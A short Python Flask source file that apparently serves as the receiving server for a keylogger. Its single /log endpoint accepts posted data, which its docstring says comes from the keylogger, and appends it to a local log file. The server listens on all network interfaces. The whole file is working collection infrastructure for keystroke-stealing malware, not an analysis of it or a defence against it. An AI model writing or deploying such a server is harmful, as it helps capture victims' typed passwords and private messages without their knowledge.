from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log():
    """
    Receives log data from the keylogger and writes it to a file.
    """
    data = request.data.decode('utf-8')
    with open('logs/logs.txt', 'a', encoding='utf-8') as f:
        f.write(data)
    return 'Log received', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
